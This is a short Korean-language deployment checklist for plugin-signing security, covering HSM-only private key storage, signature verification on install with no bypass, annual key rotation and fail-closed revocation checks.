- [ ] 마켓 서명 개인키가 Azure Key Vault HSM에만 존재 (로컬 복사본 없음)
- [ ] 앱 번들의 `market_public_key.pem` 유효성 확인 (배포 전)
- [ ] 플러그인 설치 시 `verify_plugin_signature()` 반드시 호출됨
- [ ] 서명 검증 실패 시 설치 중단 + 에러 표시 (무시 옵션 없음)
- [ ] 키 로테이션 일정 내부 캘린더에 등록 (연 1회, 1월 첫째 주)
- [ ] `revocation.json` 엔드포인트 오프라인 시 플러그인 설치 차단 (fail-closed)
